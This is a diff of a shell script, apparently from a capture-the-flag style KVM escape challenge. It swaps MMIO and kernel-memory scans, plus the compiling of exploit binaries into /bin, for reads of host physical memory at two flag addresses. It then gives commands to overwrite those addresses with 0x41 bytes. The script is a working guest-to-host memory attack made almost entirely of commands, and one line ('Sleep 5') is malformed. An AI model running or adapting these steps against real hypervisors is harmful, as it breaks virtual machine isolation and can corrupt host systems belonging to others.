@@ -109,68 +109,25 @@ echo "[*] Write flags default value"
 echo "deadbeef41424344"
 echo "with little endian: 44434241efbeadde"
 
-echo "[*] Checking potential addresses for flags"
-
-# Scanning MMIO regions
-echo "[+] Scanning MMIO region 0x02A27968"
-kvm_prober readmmio_buf 0x02A27968 64
 sleep 5
 
-echo "[+] Scanning MMIO region 0x0275ef50"
-kvm_prober readmmio_buf 0x0275ef50 64
-sleep 5
+echo "[*] Checking for write_flag @ 0x615b99a8 using command kvm_prober readhostphys 0x615b99a8 64"
+kvm_prober readhostphys 0x615b99a8 64
 
-echo "[+] Scanning MMIO region 0x02b5ee10"
-kvm_prober readmmio_buf 0x02b5ee10 64
-sleep 5
+Sleep 5
 
-echo "[+] Scanning MMIO region 0x026279a8"
-kvm_prober readmmio_buf 0x026279a8 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x64279a8"
-kvm_prober readmmio_buf 0x64279a8 64
-sleep 5
-
-echo "[+] Scanning MMIO region 0x695ee10"
-kvm_prober readmmio_buf 0x695ee10 64
-sleep 5
-
-# Scanning kernel memory
-echo "[+] Scanning kernel memory 0xffffffff826279a8"
-kvm_prober readkvmem 0xffffffff826279a8 64
-sleep 5
-
-echo "[+] Scanning kernel memory 0xffffffff82b5ee10"
-kvm_prober readkvmem 0xffffffff82b5ee10 64
-sleep 5
-
-echo "[+] Scanning kernel memory 0xffffffff82A27968"
-kvm_prober readkvmem 0xffffffff82A27968 64
-sleep 5
-
-echo "[+] Scanning kernel memory 0xffffffff8275ef50"
-kvm_prober readkvmem 0xffffffff8275ef50 64
+echo "[*] Checking for write_flag @ 0x5f4deb87 using command kvm_prober readhostphys 0x5f4deb87 64"
+kvm_prober readhostphys 0x5f4deb87 64
 
 sleep 5
 
-echo "compiling other exploits"
-
-sleep 2
-
-gcc -o kvm_exploit kvm_exploit.c
+echo "[*] look for 44434241efbeadde at both locations"
 
 sleep 5
 
-cp kvm_exploit /bin
+echo "[*] If it's present, run kvm_prober writehostphys 0x615b99a8 0x4141414141414141 and kvm_prober writehostphys 0x5f4deb87 0x4141414141414141" 
 
 sleep 5
 
-gcc -o pagemap pagemap.c
-
-sleep 5
-
-cp pagemap /bin
-
-sleep 5
-
+echo "[*] testing kvm_prober readhostphys 0x5f4deb00 256"
+kvm_prober readhostphys 0x5f4deb00 256
